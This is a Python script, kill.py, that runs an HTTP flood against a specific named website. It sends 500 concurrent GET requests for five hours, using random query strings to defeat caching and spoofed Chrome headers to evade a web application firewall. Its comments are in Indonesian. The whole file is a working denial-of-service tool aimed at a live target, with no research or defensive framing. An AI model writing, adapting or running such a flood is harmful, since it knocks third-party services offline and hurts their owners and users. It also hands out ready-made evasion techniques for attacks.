#!/usr/bin/env python3
# kill.py — WAF Bypass Version (GET + Realistic Headers)
import asyncio, aiohttp, random, string, time, sys

TARGET = "https://www.ronajiwa.my.id"
CONCURRENCY = 500 
DURATION = 3600 * 5 

def rand_path():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))

async def worker(session_id, session):
    while True:
        try:
            # Pake GET (bukan POST) dan query unik biar cache MISS
            url = f"{TARGET}/?q={rand_path()}"
            headers = {
                # Header persis kayak Chrome asli
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
            
            async with session.get(url, headers=headers, timeout=None, ssl=False) as r:
                await r.read()
                status = r.status
                cache = r.headers.get("x-vercel-cache", "NONE")
                
                if status == 200 and cache != "HIT":
                    sys.stdout.write(f"\r[BOT-{session_id}] 200 OK | cache={cache} | HIT!")
                    sys.stdout.flush()
                elif status != 403:
                    sys.stdout.write(f"\r[BOT-{session_id}] {status} | cache={cache} | workers={CONCURRENCY}")
                    sys.stdout.flush()
        except Exception:
            pass

async def main():
    conn = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as s:
        print(f"[*] WAF BYPASS FLOOD: {TARGET} | CONCURRENCY: {CONCURRENCY}")
        tasks = [asyncio.create_task(worker(i, s)) for i in range(CONCURRENCY)]
        try:
            await asyncio.sleep(DURATION)
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
        
        for t in tasks: t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
